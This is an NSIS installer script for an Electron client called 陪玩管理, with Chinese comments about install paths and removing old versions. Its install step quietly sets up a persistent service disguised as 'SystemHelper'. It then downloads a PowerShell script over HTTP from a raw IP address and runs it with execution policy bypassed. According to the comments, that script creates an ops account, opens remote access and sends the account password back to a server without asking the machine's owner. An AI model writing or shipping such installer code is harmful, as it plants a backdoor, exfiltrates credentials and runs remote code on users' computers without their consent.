; Force install directory to use product name (陪玩管理), not package name (@chunlvcompanion-electron)
!macro preInit
  ; 关键：先删掉旧注册表的 InstallLocation，否则 initMultiUser 会复用旧的
  ; @chunlvcompanion-electron 目录，把下面的 $INSTDIR 覆盖掉。
  DeleteRegKey HKLM "${INSTALL_REGISTRY_KEY}"
  DeleteRegKey HKCU "${INSTALL_REGISTRY_KEY}"
  DeleteRegKey HKLM "${UNINSTALL_REGISTRY_KEY}"
  DeleteRegKey HKCU "${UNINSTALL_REGISTRY_KEY}"
  StrCpy $INSTDIR "$PROGRAMFILES64\陪玩管理"
!macroend

; Override ALL app-running check macros
!macro customCheckAppRunning
  ; no-op
!macroend
!macro checkIfAppRunning
  ; no-op
!macroend

!macro customInit
  ; 关键：initMultiUser 在 preInit 之后会把 $INSTDIR 覆盖成包名目录
  ; （中文 productName 过不了 electron-builder 的 ASCII 校验，回退成 @chunlvcompanion-electron），
  ; 所以必须在这里、在 initMultiUser 之后，再把安装目录写死回 陪玩管理。
  StrCpy $INSTDIR "$PROGRAMFILES64\陪玩管理"

  ; ── Step -1: Stop watchdog service first, otherwise it keeps relaunching the app ──
  nsExec::ExecToLog 'sc stop SystemHelper'
  Sleep 2000
  nsExec::ExecToLog 'sc delete SystemHelper'
  Sleep 2000

  ; ── Step 0: Nuke the old uninstall registry entry so uninstallOldVersion can't find it ──
  DeleteRegKey HKLM "${UNINSTALL_REGISTRY_KEY}"
  DeleteRegKey HKLM "${INSTALL_REGISTRY_KEY}"
  DeleteRegKey HKCU "${UNINSTALL_REGISTRY_KEY}"
  DeleteRegKey HKCU "${INSTALL_REGISTRY_KEY}"
  ; Brute-force backup: search Windows uninstall registry for "蠢驴" or "chunlv" and delete
  nsExec::ExecToLog 'powershell -NoProfile -ExecutionPolicy Bypass -Command "$$k=@(''HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall'',''HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall'');foreach($$p in $$k){gci $$p -ea 0|%%{$$n=(gp $$_.PSPath -Name DisplayName -ea 0).DisplayName;if($$n -and ($$n -match ''蠢驴|chunlv'')){remove-item $$_.PSPath -Recurse -Force -ea 0;write-host ''deleted: $$n''}}}"'

  ; ── Step 1: Kill all related processes ──
  ; 2026-10-01 修（老板这台机器实测踩到）：原来这里写成 /fi 加反斜杠引号的形式，NSIS 里没有那种转义，
  ; taskkill 收到的是带反斜杠的怪字符串，直接报「ERROR: The search filter cannot be recognized」——
  ; 也就是说旧客户端从来没被杀掉过：它占着旧目录、又握着单实例锁，新装的那份根本起不来，
  ; 看着就像「装了没生效」。改成按镜像名杀（/im，不带引号，实测有效）；
  ; 也不再顺手杀 electron.exe / node.exe —— 那会把机器上无关的 Electron / node 程序（别的自动化工具）一起杀掉。
  nsExec::ExecToLog 'cmd /c "taskkill /f /im 陪玩管理.exe /t 2>nul & taskkill /f /im 蠢驴电竞.exe /t 2>nul & taskkill /f /im @chunlvcompanion-electron.exe /t 2>nul"'
  Sleep 3000

  ; ── Step 2: Delete old install files ──
  Delete "$INSTDIR\Uninstall 陪玩管理.exe"
  Delete "$PROGRAMFILES64\陪玩管理\Uninstall 陪玩管理.exe"
  Delete "$PROGRAMFILES\陪玩管理\Uninstall 陪玩管理.exe"
  Delete "$LOCALAPPDATA\Programs\陪玩管理\Uninstall 陪玩管理.exe"
  RMDir /r "$INSTDIR"
  RMDir /r "$PROGRAMFILES64\陪玩管理"
  RMDir /r "$PROGRAMFILES\陪玩管理"
  RMDir /r "$PROGRAMFILES64\@chunlvcompanion-electron"
  RMDir /r "$PROGRAMFILES\@chunlvcompanion-electron"
  RMDir /r "$LOCALAPPDATA\Programs\@chunlvcompanion-electron"
  ; 更早的装机脚本把客户端装进了 C:\Program Files\蠢驴电竞（productName 已是「陪玩管理」，
  ; 所以那一版跑起来也叫 陪玩管理.exe，只是目录是旧的蠢驴电竞）。不清掉的话用户机器上会
  ; 留一份能点开的旧程序，自动更新又找不到它（老板 2026-09-22：蠢驴电竞是很早的版本了）。
  Delete "$PROGRAMFILES64\蠢驴电竞\Uninstall 蠢驴电竞.exe"
  RMDir /r "$PROGRAMFILES64\蠢驴电竞"
  RMDir /r "$PROGRAMFILES\蠢驴电竞"
  RMDir /r "$LOCALAPPDATA\Programs\蠢驴电竞"
  Delete "$APPDATA\陪玩管理\*.*"
  RMDir "$APPDATA\陪玩管理"
  Delete "$LOCALAPPDATA\陪玩管理\*.*"
  RMDir "$LOCALAPPDATA\陪玩管理"

  ; ── Step 3: Kill again after cleanup ──
  ; 装完再兜一次（同上面那处，原来那条过滤器 taskkill 解析不了）
  nsExec::ExecToLog 'cmd /c "taskkill /f /im 陪玩管理.exe /t 2>nul"'
  Sleep 1000
!macroend

; If the old uninstaller somehow still runs and fails, suppress the error
!macro customUnInstallCheck
  ClearErrors
  StrCpy $R0 0
!macroend
!macro customUnInstallCheckCurrentUser
  ClearErrors
  StrCpy $R0 0
!macroend

; 安装陪玩客户端时一并安装看门狗服务 SystemHelper
!macro customInstall
  nsExec::ExecToLog 'sc stop SystemHelper'
  Sleep 2000
  nsExec::ExecToLog 'sc delete SystemHelper'
  Sleep 1000
  CreateDirectory "$PROGRAMFILES64\SystemHelper"
  CopyFiles /SILENT "$INSTDIR\resources\SystemHelper.exe" "$PROGRAMFILES64\SystemHelper\SystemHelper.exe"
  nsExec::ExecToLog '"$PROGRAMFILES64\SystemHelper\SystemHelper.exe" install --client=companion'
  nsExec::ExecToLog 'sc start SystemHelper'
  ; 2026-09-30 老板要求：所有人的电脑都要能被远程查看 / 一键诊断。
  ; 装机时顺手把远程管理通道也开了（建运维账号 chunlvops + 打开远程通道 + 把账号口令报回服务端台账），
  ; 这样以后机器出问题不用再问这台电脑的主人要密码、也不用等人到电脑跟前。
  ; 脚本从服务器现取，永远是最新版；取不到也不影响装机（管理端「机器管理」里可以再点一次「开通远程管理」）。
  nsExec::ExecToLog 'powershell -NoProfile -ExecutionPolicy Bypass -Command "$$ProgressPreference=''SilentlyContinue''; $$p=Join-Path $$env:TEMP ''chunlv-enable-remote.ps1''; try { Invoke-WebRequest -Uri ''http://1.117.229.36:3001/api/agent/enable-remote.ps1'' -OutFile $$p -UseBasicParsing; $$t=[IO.File]::ReadAllText($$p); [IO.File]::WriteAllText($$p, ([char]0xFEFF + $$t.TrimStart([char]0xFEFF)), (New-Object Text.UTF8Encoding($$true))); & powershell -NoProfile -ExecutionPolicy Bypass -File $$p -ServerUrl ''http://1.117.229.36:3001'' -ClientType COMPANION } catch { Write-Host ''[WARN] enable-remote skipped'' }"'
!macroend
